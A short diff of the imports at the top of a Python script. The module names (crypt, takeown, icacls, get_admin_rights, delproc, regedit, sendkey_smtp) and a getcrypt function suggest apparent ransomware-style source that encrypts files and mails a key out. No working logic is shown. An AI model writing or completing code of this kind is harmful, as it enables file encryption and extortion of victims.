@@ -1,11 +1,10 @@
 #!/usr/bin/python
 #coding:utf-8
-from cryptography.fernet import Fernet
 from modules.crypt import crypt
 from modules.permission import takeown, icacls, get_admin_rights
 from modules.system import delproc, regedit
 from modules.network import host_connect, sendkey_smtp
-import os, sys, socket, wget, struct, ctypes, shutil, winreg, time
+import os, time
 
 def getcrypt():
     gt.proc()
